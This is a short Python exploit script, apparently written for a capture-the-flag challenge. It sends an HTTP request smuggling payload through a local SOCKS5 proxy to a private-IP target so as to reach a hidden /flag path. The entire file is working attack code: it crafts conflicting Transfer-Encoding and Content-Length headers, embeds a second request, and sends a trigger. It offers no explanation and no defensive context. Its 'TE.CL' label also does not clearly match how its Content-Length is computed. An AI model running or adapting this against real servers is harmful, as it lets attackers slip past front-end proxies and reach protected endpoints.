import socks
import socket

# Configure SOCKS5 proxy
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 8123)
socket.socket = socks.socksocket

target_host = "192.168.2.199"
target_port = 53394
smuggled_host = "14828"

def send_request(request):
    sock = socket.socket()
    sock.connect((target_host, target_port))
    sock.send(request)
    response = sock.recv(8192)
    sock.close()
    return response

# Craft the TE.CL smuggling payload
smuggle = (
    b"GET /flag HTTP/1.1\r\n"
    b"Host: " + smuggled_host.encode() + b"\r\n"
    b"\r\n"
)

# First request (TE.CL attack vector)
payload = (
    b"POST / HTTP/1.1\r\n"
    b"Host: " + target_host.encode() + b"\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Content-Length: " + str(len(smuggle)).encode() + b"\r\n"
    b"\r\n"
    b"0\r\n"  # Terminates chunked encoding
    b"\r\n"
    + smuggle  # This will be treated as the next request
)

print("[*] Sending TE.CL smuggling payload:\n")
print(payload.decode('utf-8', errors='replace'))

# Send the attack
response = send_request(payload)
print("[+] First response:\n", response.decode('utf-8', errors='replace'))

# Second request (to trigger the smuggled request)
print("[*] Sending trigger request...")
response2 = send_request(smuggle)
print("[+] Second response:\n", response2.decode('utf-8', errors='replace'))